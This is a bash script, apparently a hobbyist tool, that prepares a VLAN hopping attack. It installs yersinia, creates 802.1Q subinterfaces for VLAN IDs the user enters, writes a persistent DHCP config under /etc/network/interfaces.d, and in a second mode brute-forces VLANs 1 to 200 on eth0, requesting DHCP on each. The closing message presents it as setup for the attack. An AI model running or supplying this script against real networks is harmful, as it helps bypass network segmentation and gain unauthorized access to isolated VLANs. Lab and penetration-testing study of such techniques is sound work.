#!/bin/bash

# Vlan Hoping setup script 

sudo apt update
sudo apt install yersinia vlan -y
while true; do
    clear
    echo "Choose an option:"
    echo "1. Static VLAN Configuration"
    echo "2. Dynamic VLAN Configuration"
    echo "3. Exit"

    read -p "Enter the number of your choice: " choice

    case $choice in
        1)
            echo "You selected Static VLAN Configuration."
           eth_ports=$(ip link | awk -F: '$2 ~ /eth[0-9]+/ {print $2}')
PS3="Select an Ethernet interface: "
select IFACE in $eth_ports "Quit"; do
    case "$IFACE" in
        "Quit")
            echo "Exiting script."
            exit 0
            ;;
        *)
            if [ -n "$IFACE" ]; then
                echo "You selected: $IFACE"
                break
            else
                echo "Invalid selection. Please choose a valid option."
            fi
            ;;
    esac
done
#
echo "enter vlan id in Numirical value only, if you are trying to hop onto vlan5 then just type the number 5; press ENTER to continue"

read

read -p "first vlan ID to hop-----_" VL1
read -p "second Vlan ID to hop----_" VL2
read -p "third Vlan ID to Hop----_" VL3

sudo modprobe 8021q
sudo ip link add link $IFACE name $IFACE.$VL1 type vlan id $VL1
sudo ip link add link $IFACE name $IFACE.$VL2 type vlan id $VL2
sudo ip link add link $IFACE name $IFACE.$VL3 type vlan id $VL3

FILE_PATH=/etc/network/interfaces.d/VL_HOP.txt
FILE_CONTENT="
auto $IFACE.$VL1
iface $IFACE.$VL1 inet dhcp
vlan-raw-device $IFACE

auto $IFACE.$VL2
iface $IFACE.$VL2 inet dhcp
vlan-raw-device $IFACE

auto $IFACE.$VL3
iface $IFACE.$VL3 inet dhcp
vlan-raw-device $IFACE"

sudo sh -c "echo '$FILE_CONTENT' > '$FILE_PATH'"

if [ -e "$FILE_PATH" ]; then
    echo "File created successfully at $FILE_PATH."
else
    echo "Failed to create the file."
    exit 0
fi

echo " You should be set up to attempt a vlan hoping attack, read up on the tool YERSINIA for further instructions, I am tired of writing this script already, lol"
read
            ;;
        2)
            echo "You selected Dynamic VLAN Configuration."
            for vlan_id in {1..200}; do
            subinterface="eth0.${vlan_id}"
            # Create the VLAN subinterface
            sudo ip link add link eth0 name "${subinterface}" type vlan id ${vlan_id}
            # Bring up the subinterface
            sudo ip link set dev "${subinterface}" up
            # Configure the subinterface for DHCP
            sudo dhclient "${subinterface}"
            done
            ;;
        3)
            echo "Exiting the script."
            exit 0
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
    esac

    read -p "Press Enter to continue..."
done




